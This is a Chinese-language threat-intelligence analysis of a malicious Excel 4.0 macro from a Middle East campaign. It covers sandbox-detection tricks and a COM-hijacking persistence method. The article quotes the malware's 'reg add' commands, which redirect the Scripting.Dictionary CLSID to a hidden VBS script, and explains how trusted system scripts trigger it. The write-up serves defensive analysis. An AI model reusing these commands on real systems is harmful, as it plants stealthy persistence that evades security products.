## **情报背景**

近期，卡巴斯基安全团队捕获了一个具有信息搜集和命令执行功能的MS Excel
4.0宏样本。攻击者对执行环境进行了充分的信息收集，保证执行环境安全之外，还针对环境中不同的安全产品采取针对性的持久化手段。本篇文章将对本次攻击事件中的沙箱检测手法及配合COM劫持的持久化技术进行分析研判。

 **战术标签**

|

防御规避 持久化  
  
---|---  
  
 **技术标签**

|

沙箱检查 COM劫持与持久化  
  
 **情报来源**

|

https://securelist.com/wirtes-campaign-in-the-middle-east-living-off-the-land-since-at-least-2019/105044/  
  
## 攻击技术分析

 **亮点1：沙箱检查方法**

攻击者在诱导用户打开并启用宏后，通过宏函数执行三个基本反沙箱检查：

a) 获取运行环境相关信息

包括系统环境名称、系统位数与NT版本号。在宏代码中，通过相关API调用可以实现对操作系统版本的判断，实例如下：

![1640058606_61c14eeef2ae3af9cb907.png!small?1640058608014](https://image.3001.net/images/20211221/1640058606_61c14eeef2ae3af9cb907.png!small?1640058608014)

b) 检查鼠标是否存在

在VBS脚本中，可以通过检查鼠标是否存在，以判断自身是否运行于真实环境中，示例脚本如下：

![1640058631_61c14f077fbcd7f9cbd18.png!small?1640058632531](https://image.3001.net/images/20211221/1640058631_61c14f077fbcd7f9cbd18.png!small?1640058632531)

能够检测到鼠标等外设的存在

![1640058677_61c14f35b22a9cdb72a4e.png!small?1640058678697](https://image.3001.net/images/20211221/1640058677_61c14f35b22a9cdb72a4e.png!small?1640058678697)

c) 检查主机是否可以播放声音

![1640058685_61c14f3dd2ffe9ffbe349.png!small?1640058686853](https://image.3001.net/images/20211221/1640058685_61c14f3dd2ffe9ffbe349.png!small?1640058686853)

  

通过这种利用正常宿主环境与沙箱环境间的差异细节进行沙箱判定，以鉴别自身是否运行在沙箱等分析环境中。通过利用虚拟机等环境在硬件上与真实环境的区别，保证执行环境的安全。

 **亮点2：配合COM劫持利用白名单脚本完成持久化**

攻击者会依据当前系统中存在的杀软选择对应的持久化方式。此处攻击者针对特定的安全产品采用了COM劫持与白名单脚本计划任务相结合的持久化手段。相较于直接在计划任务中执行恶意脚本，执行系统自带的白名单脚本更加具有隐蔽性，对特定的安全产品有较好的检测规避效果。

a) Scripting.Dictionary COM接口劫持后门

    
    
    If chk <> "xxxSecurity" Then whome.Run "reg add HKCU\Software\Classes\Scripting.Dictionary\CLSID\ /f /ve /d {14C34482-E0A7F-44CF-B261-385B616C54EC}", 0  
    End If:  
    If chk <> "xxxSecurity" Then whome.Run "reg add HKCU\Software\Classes\CLSID\{14C34482-E0A7F-44CF-B261-385B616C54EC}\lOCALsERVER32 /f /ve /d ""wscript.exe //b C:ProgramData\winrm.vbs""",0  
    End If

攻击者首先在HKCU注册表（无需管理员权限）中添加自定义的CLSID，指向攻击者的恶意脚本，并篡改“Scripting.Dictionary“接口的CLSID。达到任何对”Scripting.Dictionary”接口的引用都会导致恶意VBS被执行的效果。

b) 以白名单脚本为后门触发器实现持久化

![1640058721_61c14f61714aa33e2bc3a.png!small?1640058726730](https://image.3001.net/images/20211221/1640058721_61c14f61714aa33e2bc3a.png!small?1640058726730)

攻击者依据执行条件选择不同的触发方式

攻击者在执行条件满足的情况下使用系统中用于用户密钥激活的slmgr.vbs脚本触发COM劫持执行恶意代码，并创建计划任务实现持久化。除此以外，用于系统管理的自带脚本winrm.vbs也可触发该后门。这两个白名单vbs脚本中均存在引用Scripting.Dictionary的代码片段，这是触发后门的原因。

## 总结

1\. 配合COM劫持技术，利用合法脚本中对特定接口的引用，将合法脚本作为恶意行为的触发器，增加了发现难度

2\. 对运行环境与主机安全软件信息进行充分的收集，并针对不同安全产品采取针对性的规避措施，达到较好的实战效果

3\. 使用基于解释性语言的恶意文件（如VBS等），增加了其避免静态检测的灵活性

